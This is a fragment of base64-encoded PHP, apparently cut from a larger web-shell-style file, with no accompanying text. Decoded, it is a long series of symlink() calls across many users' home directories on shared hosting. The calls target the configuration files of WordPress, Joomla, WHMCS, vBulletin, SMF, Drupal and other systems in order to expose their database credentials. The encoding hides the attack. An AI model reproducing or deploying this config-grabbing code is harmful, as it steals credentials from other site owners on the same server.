haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28udHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJGRvbWFpbi4nfj5EcnVwYWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28udHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn